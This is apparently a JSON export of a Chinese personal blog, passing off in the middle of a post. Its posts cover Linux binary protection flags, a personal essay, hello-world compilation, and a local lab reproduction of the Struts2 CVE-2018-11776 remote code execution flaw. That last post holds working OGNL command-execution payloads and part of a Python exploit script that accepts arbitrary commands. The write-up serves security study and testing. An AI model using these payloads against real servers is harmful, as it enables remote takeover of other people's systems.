{"meta":{"title":"Simle丶樱木","subtitle":"胆小怕生,不易相处","description":"心若在，梦就在。","author":"Simle丶樱木","url":"https://yubenliu.cn"},"pages":[{"title":"about","date":"2019-07-02T09:50:37.000Z","updated":"2019-11-12T07:01:57.550Z","comments":true,"path":"about/index.html","permalink":"https://yubenliu.cn/about/index.html","excerpt":"","text":""},{"title":"friends","date":"2019-07-02T09:51:10.000Z","updated":"2019-11-12T07:01:57.552Z","comments":true,"path":"friends/index.html","permalink":"https://yubenliu.cn/friends/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-07-02T09:26:23.000Z","updated":"2019-11-12T07:01:57.553Z","comments":true,"path":"categories/index.html","permalink":"https://yubenliu.cn/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2019-07-02T09:28:20.000Z","updated":"2019-11-12T07:01:57.550Z","comments":true,"path":"tags/index.html","permalink":"https://yubenliu.cn/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"linux程序的保护机制","slug":"linux程序保护机制","date":"2019-11-12T07:01:57.544Z","updated":"2019-11-12T07:01:57.544Z","comments":true,"path":"2019/11/12/linux程序保护机制/","link":"","permalink":"https://yubenliu.cn/2019/11/12/linux程序保护机制/","excerpt":"最近看了一些PWN 的题目，在此总结一波，这篇文章有些资料来自各网友的总结。像我这样记忆力比较差的人，还是要多记录。 操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险，包括DEP、ASLR等。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了DEP（Linux下对应NX）、ASLR（Linux下对应PIE）等机制，例如存在DEP（NX）的话就不能直接执行栈上的数据，存在ASLR的话各个系统调用的地址就是随机化的。","text":"最近看了一些PWN 的题目，在此总结一波，这篇文章有些资料来自各网友的总结。像我这样记忆力比较差的人，还是要多记录。 操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险，包括DEP、ASLR等。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了DEP（Linux下对应NX）、ASLR（Linux下对应PIE）等机制，例如存在DEP（NX）的话就不能直接执行栈上的数据，存在ASLR的话各个系统调用的地址就是随机化的。 关于 NX PIE的参考链接 http://tacxingxing.com/2017/07/15/pie-alsr/ ##一、关于 checksec Checksec是一个bash脚本，用于检查可执行文件的属性（如PIE，RELRO，PaX，Canaries，ASLR，Fortify Source）。它最初由Tobias Klein编写，原始资料来源 www.trapkit.de/tools/checksec.html github 地址 https://github.com/slimm609/checksec.sh 使用说明 具体的例子（如果安装gdb自带checksec） 二、CANNARY(栈保护)这个选项表示栈保护功能有没有开启。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。 gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。 因此在编译时可以控制是否开启栈保护以及程度，例如： gcc -o test test.c // 默认情况下，不开启Canary保护 gcc -fno-stack-protector -o test test.c //禁用栈保护 gcc -fstack-protector -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码 gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码 三、 FORTIFY 介绍fority其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets以及宽字符的变体。 说明_FORTIFY_SOURCE设为1，并且将编译器设置为优化1(gcc -O1)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能 _FORTIFY_SOURCE设为2，有些检查功能会加入，但是这可能导致程序崩溃。 gcc -D_FORTIFY_SOURCE=1 仅仅只会在编译时进行检查 (特别像某些头文件 #include &lt;string.h&gt;) gcc -D_FORTIFY_SOURCE=2 程序执行时也会有检查 (如果检查到缓冲区溢出，就终止程序) 举个例子可能简单明了一些：一段简单的存在缓冲区溢出的C代码 void fun(char *s) { char buf[0x100]; strcpy(buf, s); /* Don&#39;t allow gcc to optimise away the buf */ asm volatile(&quot;&quot; :: &quot;m&quot; (buf)); } 用包含参数-U_FORTIFY_SOURCE编译 08048450 &lt;fun&gt;: push %ebp ; mov %esp,%ebp sub $0x118,%esp ; 将0x118存储到栈上 mov 0x8(%ebp),%eax ; 将目标参数载入eax mov %eax,0x4(%esp) ; 保存目标参数 lea -0x108(%ebp),%eax ; 数组buf mov %eax,(%esp) ; 保存 call 8048320 &lt;strcpy@plt&gt; leave ; ret 用包含参数-D_FORTIFY_SOURCE=2编译 08048470 &lt;fun&gt;: push %ebp ; mov %esp,%ebp sub $0x118,%esp ; movl $0x100,0x8(%esp) ; 把0x100当作目标参数保存 mov 0x8(%ebp),%eax ; mov %eax,0x4(%esp) ; lea -0x108(%ebp),%eax ; mov %eax,(%esp) ; call 8048370 &lt;__strcpy_chk@plt&gt; leave ; ret 我们可以看到gcc生成了一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。 总结下就有: gcc -o test test.c // 默认情况下，不会开这个检查 gcc -D_FORTIFY_SOURCE=1 -o test test.c // 较弱的检查 gcc -D_FORTIFY_SOURCE=2 -o test test.c // 较强的检查 四、NX（DEP）(数据执行保护 Data Execution Prevention)NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 工作流程 gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。例如： gcc -o test test.c // 默认情况下，开启NX保护 gcc -z execstack -o test test.c // 禁用NX保护 gcc -z noexecstack -o test test.c // 开启NX保护 参考介绍文章 dep原理及突破方法 [1]:https://blog.csdn.net/zy_strive_2012/article/details/9119153 五、PIE（ASLR）一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。 内存地址随机化机制（address space layout randomization)，有以下三种情况 0 - 表示关闭进程地址空间随机化。 1 - 表示将mmap的基址，stack和vdso页面随机化。 2 - 表示在1的基础上增加栈（heap）的随机化。 可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。 Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。 liunx下关闭PIE的命令如下： sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space -gcc 编译命令 gcc -o test test.c // 默认情况下，不开启PIE gcc -fpie -pie -o test test.c // 开启PIE，此时强度为1 gcc -fPIE -pie -o test test.c // 开启PIE，此时为最高强度2 gcc -fpic -o test test.c // 开启PIC，此时强度为1，不会开启PIE gcc -fPIC -o test test.c // 开启PIC，此时为最高强度2，不会开启PIE 说明 PIE最早由RedHat的人实现，他在连接起上增加了-pie选项，这样使用-fPIE编译的对象就能通过连接器得到位置无关可执行程序。fPIE和fPIC有些不同。可以参考Gcc和Open64中的-fPIC选项. gcc中的-fpic选项，使用于在目标机支持时，编译共享库时使用。编译出的代码将通过全局偏移表(Global OffsetTable)中的常数地址访存，动态装载器将在程序开始执行时解析GOT表项(注意，动态装载器操作系统的一部分，连接器是GCC的一部分)。而gcc中的-fPIC选项则是针对某些特殊机型做了特殊处理，比如适合动态链接并能避免超出GOT大小限制之类的错误。而Open64仅仅支持不会导致GOT表溢出的PIC编译。 gcc中的-fpie和-fPIE选项和fpic及fPIC很相似，但不同的是，除了生成为位置无关代码外，还能假定代码是属于本程序。通常这些选项会和GCC链接时的-pie选项一起使用。fPIE选项仅能在编译可执行码时用，不能用于编译库。所以，如果想要PIE的程序，需要你除了在gcc增加-fPIE选项外，还需要在ld时增加-pie选项才能产生这种代码。即gcc -fpie -pie来编译程序。单独使用哪一个都无法达到效果。 六、RELRO在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处. GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术: read only relocation。大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读. 设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。 gcc编译： gcc -o test test.c // 默认情况下，是Partial RELRO gcc -z norelro -o test test.c // 关闭，即No RELRO gcc -z lazy -o test test.c // 部分开启，即Partial RELRO gcc -z now -o test test.c // 全部开启，即 七、总结1. NX：-z execstack / -z noexecstack (关闭 / 开启) 2. Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启) 3. PIE：-no-pie / -pie (关闭 / 开启) 4. RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启) ##八、入门的参考文章 缓冲区溢出的应用实例CTF github资源整合PWN的入门手把手教你栈溢出从入门到放弃","categories":[{"name":"linux程序的保护机制","slug":"linux程序的保护机制","permalink":"https://yubenliu.cn/categories/linux程序的保护机制/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://yubenliu.cn/tags/逆向/"},{"name":"ctf","slug":"ctf","permalink":"https://yubenliu.cn/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://yubenliu.cn/tags/pwn/"}]},{"title":"小心情","slug":"xiaoqiu","date":"2019-08-23T06:20:00.000Z","updated":"2019-11-12T07:01:57.546Z","comments":true,"path":"2019/08/23/xiaoqiu/","link":"","permalink":"https://yubenliu.cn/2019/08/23/xiaoqiu/","excerpt":"与你分享，最自我的存在，最重要的秘密。 脑海里存在过好多个故事大多包含了我爱你的主题 它们可能在我想你的某些须臾发生了 然后消失在我无法说忘记的深深自责里 偶尔会记录下的都是可以用言语概论的 在我觉得实在是孤单了喔 说与 除了你我的爱人们听","text":"与你分享，最自我的存在，最重要的秘密。 脑海里存在过好多个故事大多包含了我爱你的主题 它们可能在我想你的某些须臾发生了 然后消失在我无法说忘记的深深自责里 偶尔会记录下的都是可以用言语概论的 在我觉得实在是孤单了喔 说与 除了你我的爱人们听 我还是喜欢和你面对面交谈 坐在相同的时间和空间里 对你感到无语的时候就真的不发一言 你对我心存怀疑的时候可以看着我的眼睛 他会告诉你我是个好人以及不愿说出口的我爱你 喜欢陌生的街区 无知的人行道 风带过来的都是那些无知人的气味儿 你敢信么 走在拥挤的人潮中我反而安心 那些结伴的骑行者他们的欢颜 风尘仆仆的赶路人 推着婴儿车的年轻母亲 我似乎见过无数次这样的面孔 他们好像发生着同样的故事 然而生活本就是如此 千篇一律 那些个学画的日子里 兴奋失落骄傲迷茫哭泣 有你 有她们有青春 想来都是无比珍贵 细数不尽的 这个世界上 我最畏惧的就是时间了 那个傻瓜阿 “明年我要带着一大束玫瑰花去军队” 她喊我的名字 说“我决定了” 我们经常郑重其事地做一些决定 然而我还是被点燃了 我幻想幸福的场景美好的结局 我哭着拥抱她说“为你高兴” 她轻拍着我的后背 在我耳边说“你也会等到这一天的。” 还带着把握住了幸福的女孩应该有的沉稳语调 早上自然醒 想到运动会那天 你把食指贴近嘴唇作出嘘的动作 脸上还挂着谈话时的笑意 样子特别好看 然后就看到你们的实习老师走了过来 跳远结束的时候 你屁颠屁颠跑回来 一脸兴奋说着刚如何摔惨了丢人了 样子特别可爱 可不可以借我一个“从此” 我的故事该完结了 但是 安徒生先生已经把最后一个“从此”也用掉了 要不你试试看我的“后来”“以后”“最后”或者“然后” 不了， 看来我只能让我的王子和公主死掉了 我有时会对自己说，写个故事吧。生活这么无趣，随便写个开头结尾，就能打动人。后来往往无果，因为生活面孔多，生活其实比故事厉害，觉得生活无聊就写不出好看的故事。人为什么会觉得无聊，人们总说，今天简直无聊得要死，这句话其实一点也不夸张啊。有人会选择死亡，要么因为懦弱，他们是被困难打败了；要么就是无聊教唆的，他们无所恋了。我显然还是有所恋的， 就算单恋一个人我也持续了够久。我还是乐意去编织一些乱七八糟的东西，或记录某些真实 给以后。感到无聊的时候，就会把时间奉给想念。离世的长辈，许久未见的朋友，不知去向的故人，不曾相恋的恋人。运气不错的话，过程中就能收获灵感。潜意识里那些想说的话，会在一瞬间，自己就排列组合小跑而来。 那女人按照惯例，在星期一的早晨，又开始数落起她可怜的丈夫。“我真是受够了，看看你没出息的样子。”她先是重复了上周以及上上周以及上上上周的开场白。他的丈夫沉默不语，或许没听到，因为他正 “记得把牛奶喝掉，喝完记得把杯子洗干净。我去上班了，这日子简直没法过了。”结束语也一样。 能随着性子，最终完成一件事。便十分美好。 朝闻道，夕死可矣。人们想要强调某件事时，总会把话说得极其夸张。 相对老无所依这样故弄玄虚的电影，还是更喜欢听别人实实在在讲故事。比如一次别离，比如通天塔。它们首先是想好好讲一个好故事，而后希望发人深省产生讨论。它们讲礼貌，是特别有诚意的诉说者。 我们是动物孤独地过冬春天来了我把自己滚成一个球沿路摘几颗新鲜的酱果赶到你家门口等待你慢慢苏醒的样子你扑腾了几下张开了翅膀看到坐在树下的我你高兴地俯冲下来叼走了我背上的紫色酱果然后飞走了我拾起你掉落的羽毛如获珍宝 回忆往常日子里所有与你的对视 夏尔走了之后每个星期都会去镇上喝酒最近去得比较频繁我爱上了一个姑娘每天下午三点她会推着小推车来给酒馆送酒一个月过去夏尔还没有回来我带姑娘回家她自己脱衣服然后洗澡在做第三次的时候她说我知道你不爱我你只不过想讲一个故事 你连一把好剑都没有你也好意思说自己是行侠仗义的江湖中人那个兜里不过揣了几把小刀的卷卷头竟也嘲笑我当时我也是年轻气盛冲上去几拳把他打倒在地眼看他一脸血我接着用力补了几脚就扬长而去隐约听到围观的人群中传来声音小李小李你没事吧我顾自向前 她突然说“我妈妈是在酉时生下我的，日落酉时，记住啦，我死了你要告诉道士先生呀”“日落有时？就像现在太阳要下山了吗？”“恩，就是傍晚了，好好记住，他们都不知道，我们家总要有一个人知道。”我突然明白这件事是非常神圣的，那年我六七岁，她只告诉我一个人。就在几年前她离开。非常突然，我们每个人都开始自责。她离开之前，家里还在商量她的99岁大寿。出殡那天，我和姑姑还有另外几个人坐一辆车，有个女人一直大声说笑，吵吵闹闹。我想抽她一耳光。我看着窗外，姑姑搂着我。一直下着小雨。 小时候第一次在户口簿上看到她的名字我嘲笑她说谁给你取的名字啊张大姐 也是第一次知道她不姓杨而是姓张 通常我们坐在一起的时候我不大记得是谁先开口说第一句话 坐在那里抽烟的男人外套歪躺在沙发上墙脚立着一盆绿植，叶子大而茂盛女人不知去了哪里，菜摆在桌上慢慢凉从窗外飞来一只鸟，横冲直撞男人熄灭了半支的烟，躺在沙发上外套压在身下，露出半只袖鸟儿飞来飞去不觉得累汤面上结起一层油花，女人没有回来而墙角立着一盆绿植鸟儿横冲直撞 和薇聊了好多，五年内几乎没有联系，我给她讲现在的自己，猛然发现曾经最爱做的事情现在依然，写字画画喜欢kimi。你变了么 2013.12.16 杭州下雪了和你生活在同一座城市的好处是 感受 同样的天气两点钟的时候 各自发条状态迎接季节赠予的礼物 是的下雪了过去几天的雾霾 似乎对我没什么影响好像事不关己早上下雨 冷 撑一把大大的 枣红色的伞下午坐在寝室看非诚勿扰 窗外 雪很大超美的 为什么在做事情之前，我不告诉自己，一定要做到最好，要尽到最大的努力去完成。以前总爱顺其自然。我对自己一直很客气，所以我变成特别容易满足的人，对别人也完全没有杀伤力。可能快乐至上吧。失之坦然，得之淡然，处之泰然，顺其自然。并不去给一个对错的判断，快乐就好。最终信仰是：永远忠于自己。 以前有愿望写故事，以为能像我做其他事情一样顺其自然，没有提纲就这么一味地写，隔半年想再接下去，却发现不能像当初一样随心所欲了。当有无数种可能摆在你面前的时候，你都不知道该如何走向当初设定好的结局。 我喜欢在家里转圈圈，这样可以带动思考。额(⊙o⊙)…，好吧，我承认我给我的怪癖找了一个冠冕堂皇的借口。 小时候有暴力倾向。有时认为自己是个自闭症患者。 大概十一岁的时候我开始懂得构建自己的精神世界，后来开始患得患失，慢慢的，会把自己的情绪放大化，喜欢的人和事物会尤其喜欢，而且持久。 一生中我们会遇到形形色色的人，入耳许许多多的事，无论你是否主动搭讪这个世界，世界总能带给我们改变。2013年夏天，我在南京。这段旅程蓄谋已久。其然实践起来也并不难，我们甚至连车票都没有提前买好，背着包约定在车站见面。行李简单，拖着一双洞洞鞋，见面是一个不陌生的拥抱。她说的第一句话是，好想你啊。我说的是，好热啊。开玩笑的，你知道我是如此爱你。我相信那些独自旅行的人都是因为找不到合适的伴侣。那个白天我们在图书馆待到闭馆，然后坐着旧巴士穿越了长兴这座小城，从北到南。深夜吃了干挑面，坐在马路边。差不多是凌晨四点的时候，我们坐上了开往南京的火车。从一开始，这段旅程的定义就是要不断给自己找麻烦。八月份，南京，取消青旅预订床位，火车···晚上我们坐在秦淮河旁，有人彻夜聊天，有陌生人和我们坐一桌，扰得我不安稳。有点小雨，我睡着了，她给我支起雨伞，我醒来觉得好笑。且说到这吧。倘若两个人有共同的记忆，一提便会想起来。 昨天的小清新和之前没写完的故事，就先不分享了。 该快乐快乐，该烦躁烦躁，建议你快乐","categories":[{"name":"心情","slug":"心情","permalink":"https://yubenliu.cn/categories/心情/"}],"tags":[{"name":"心情","slug":"心情","permalink":"https://yubenliu.cn/tags/心情/"},{"name":"随笔","slug":"随笔","permalink":"https://yubenliu.cn/tags/随笔/"}]},{"title":"helloworld生命周期","slug":"helloword","date":"2019-08-21T06:20:00.000Z","updated":"2019-11-12T07:01:57.545Z","comments":true,"path":"2019/08/21/helloword/","link":"","permalink":"https://yubenliu.cn/2019/08/21/helloword/","excerpt":"在我们要学习一门编程语言的时候第一个程序基本上是helloworld，但就是这个简单的程序到底是如何运行的，在此做一下记录。","text":"在我们要学习一门编程语言的时候第一个程序基本上是helloworld，但就是这个简单的程序到底是如何运行的，在此做一下记录。 文章中的部分内容来自《深入理解计算机系统》第一章helloworld 从到创建，执行，输出简单消息，再到终止，中间到底是如何运行的。简单介绍下。 代码 #include&lt;stdio.h> int main(int argc, char const *argv[]) { printf (\"hello world \\n\"); return 0; } 二进制文本 计算机中，数据的存储我们看到的是一串英文代码，其实存储的是2进制数据，helloworld 程序的代码可以用 ASCLL码表示。再把具体的ASCLL码转为为2进制。 如图中的23对应的10进制数据为35 而35对应的为# 程序被其他程序翻译成不同的格式hello程序从一个高级的c程序开始因为这样更容易让人读懂。但是如果要运行hello这个程序，必须要转为编译成更低的机器语言。 在Linux 中从源程序到目标程序是由编译器完成的。 可以用file 命令查看目标程序的详细信息 可以看出这个程序的格式为elf(对应的Windows下的编译的为pie) 64为程序，因为处理器是向下兼容的如果要生成32位程序可以使用 (-m32) 在编译中到底经历了哪些阶段 预处理阶段（cpp）根据以#号开头的命令，修改原始的c程序，比如helloworld 中的第一行 #include&lt;stdio.h&gt;命令告诉预处理器读取系统头文件stdio.h 的内容.并把他直接插入程序文本中，得到一个c程序 ,通常是以 .i 为扩张名。stdio.h 文件在Linux中的（/usr/include目录下) 编译阶段，汇编器(ccl)为把上面的helloworld.i 反义成hello.s他包含一个汇编语言程序，用（ida查看汇编程序） 汇编阶段：把源程序的helloworld.s 翻译成机器语言指令。并将结果保存在 helloworld.o文件中，helloworld.o 是一个2进制文件 链接阶段： 源程序中的hellworld 调用了printf 函数 ，他是每一个\bC 编辑器提供的标准c库中的一个函数，printf 函数存在一个名为printf.o的单独的预编译好的目标文中中，而这个文件必须以某种形式合并到我们helloworld.o程序中链接器(ld)就负责这种合并。结果生产一个可执行的文件为helloworld。 ida 查看链接的printf 函数 运行helloworld程序：","categories":[{"name":"helloworld生命周期","slug":"helloworld生命周期","permalink":"https://yubenliu.cn/categories/helloworld生命周期/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://yubenliu.cn/tags/逆向/"},{"name":"计算机系统","slug":"计算机系统","permalink":"https://yubenliu.cn/tags/计算机系统/"}]},{"title":"CVE-2018-11776漏洞复现","slug":"CVE-2018-11776漏洞复现","date":"2019-08-02T06:20:00.000Z","updated":"2019-11-12T07:01:57.541Z","comments":true,"path":"2019/08/02/CVE-2018-11776漏洞复现/","link":"","permalink":"https://yubenliu.cn/2019/08/02/CVE-2018-11776漏洞复现/","excerpt":"","text":"0x01 漏洞概述2018年8月23日，ApacheStrust2发布最新安全公告，ApacheStruts2 存在远程代码执行的高危漏洞，该漏洞由SemmleSecurity Researchteam的安全研究员汇报，漏洞编号为CVE-2018-11776（S2-057）。 定义XML配置时如果namespace值未设置且上层动作配置（Action Configuration）中未设置或用通配符namespace时可能会导致远程代码执行。URL标签未设置value和action值且上层动作未设置或用通配符namespace时可能会导致远程代码执行，以及系统命令到服务器系统中去 。 0x02 影响版本Apache struts 2.3-Apache struts 2.3.34 Apache struts 2.5-Apache struts 2.5.16 0x03 漏洞复现复现环境 windows 10 jdk1.8.0_191 apache-tomcat-7.0.96 struts-2.3.34 环境搭建首先安装jdk，并配置环境变量，不再赘述 下载 apache-tomcat 并解压 下载 Struts-2.3.34 解压，并将apps目录下的 struts2-showcase.war 复制到tomcat的webapps目录下 在tomcat下bin目录下运行startup.bat脚本来启动tomcat，启动后自动部署struts2 浏览器访问 http://127.0.0.1:8080/struts2-showcase，出现如下界面即为部署成功了。 正常部署完成struts如上所示，但为了复现struts2-057漏洞，需要修改如下两个文件（tomcat目录下） D:\\Program Files\\Java\\apache-tomcat-7.0.96\\webapps\\struts2-showcase\\WEB-INF\\src\\java\\struts-actionchaining.xml D:\\Program Files\\Java\\apache-tomcat-7.0.96\\webapps\\struts2-showcase\\WEB-INF\\classes\\struts-actionchaining.xml 注释掉原来的xml代码，修改如下 &lt;struts&gt; &lt;package name=&quot;actionchaining&quot; extends=&quot;struts-default&quot;&gt; &lt;action name=&quot;actionChain1&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain1&quot;&gt; &lt;result type=&quot;redirectAction&quot;&gt; &lt;param name = &quot;actionName&quot;&gt;register2&lt;/param&gt; &lt;/result&gt; &lt;/action&gt; &lt;action name=&quot;actionChain2&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain2&quot;&gt; &lt;result type=&quot;chain&quot;&gt;actionChain3&lt;/result&gt; &lt;/action&gt; &lt;action name=&quot;actionChain3&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain3&quot;&gt; &lt;result&gt;/WEB-INF/actionchaining/actionChainingResult.jsp&lt;/result&gt; &lt;/action&gt; &lt;/package&gt; &lt;/struts&gt; 在tomcat下bin目录下运行shutdown.bat，startup.bat脚本来重启tomcat。重启tomcat！！！重启tomcat！！！重启tomcat！！！浏览器访问http://192.168.10.230:8080/struts2-showcase/,漏洞环境成功搭建 漏洞利用在URL构造ognl表达式，再加上配置文件中的action标签中的name属性值，并以.action结尾http://127.0.0.1:8080/struts2-showcase/${(50+50)}/actionChain1.action执行完成之后发现跳转到了http://127.0.0.1:8080/struts2-showcase/100/register2.action执行了ognl 表达式 ${(50+50)},漏洞存在 进一步利用漏洞，弹出计算器，构造payload ${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#cmd=@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;))} 进行URL编码 %24%7b%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%63%74%3d%23%72%65%71%75%65%73%74%5b%27%73%74%72%75%74%73%2e%76%61%6c%75%65%53%74%61%63%6b%27%5d%2e%63%6f%6e%74%65%78%74%29%2e%28%23%63%72%3d%23%63%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%75%3d%23%63%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%2e%28%23%63%6d%64%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%29%7d 拼接 127.0.0.1:8080/struts2-showcase/%24%7b%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%63%74%3d%23%72%65%71%75%65%73%74%5b%27%73%74%72%75%74%73%2e%76%61%6c%75%65%53%74%61%63%6b%27%5d%2e%63%6f%6e%74%65%78%74%29%2e%28%23%63%72%3d%23%63%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%75%3d%23%63%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%2e%28%23%63%6d%64%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%29%7d/actionChain1.action 成功执行 EXP#coding: utf-8 #! python2 import requests import sys def expliot(host, command, path): &#39;&#39;&#39; 2.3.34版本 payload1: ${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ipconfig&#39;).getInputStream()))).(#w.close())} 2.3.20版本 payload2: ${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ipconfig&#39;).getInputStream()))).(#w.close())} &#39;&#39;&#39; str1 = &quot;${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;&quot; + command + &quot;&#39;).getInputStream()))).(#w.close())}&quot; str1 = str1.encode(&#39;hex&#39;) str2 = &quot;${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;&quot; + command + &quot;&#39;).getInputStream()))).(#w.close())}&quot; str2 = str2.encode(&#39;hex&#39;) # 需要进行URL编码 payload1 = &quot;&quot; for i in 